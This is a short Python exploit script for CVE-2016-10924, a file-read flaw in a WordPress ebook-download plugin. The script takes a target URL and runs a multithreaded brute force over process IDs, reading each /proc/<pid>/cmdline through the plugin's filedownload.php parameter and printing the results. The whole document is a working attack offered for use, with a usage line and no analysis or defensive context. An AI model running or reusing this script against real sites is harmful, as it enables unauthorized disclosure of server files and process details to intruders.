# Python based multithreaded PID Bruteforce
# CVE-2016-10924 
# How to use python3 CVE-2016-10924.py
import concurrent.futures
import requests

def process_proc_path(proc_id, base_url):
    path = f"/proc/{proc_id}/cmdline"
    skip_start = 3 * len(path) + 1
    skip_end = 32

    url = f"{base_url}/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl={path}"
    response = requests.get(url)
    output = response.text[skip_start:].rstrip()[:-skip_end].rstrip('\0') if response.status_code == 200 else None
    if output:
        print(f"{proc_id}: {output}")

def main():
    base_url = input("Enter the base URL: ")
    with concurrent.futures.ThreadPoolExecutor() as executor:
        proc_ids = range(1, 50001)
        executor.map(lambda proc_id: process_proc_path(proc_id, base_url), proc_ids)

if __name__ == "__main__":
    main()
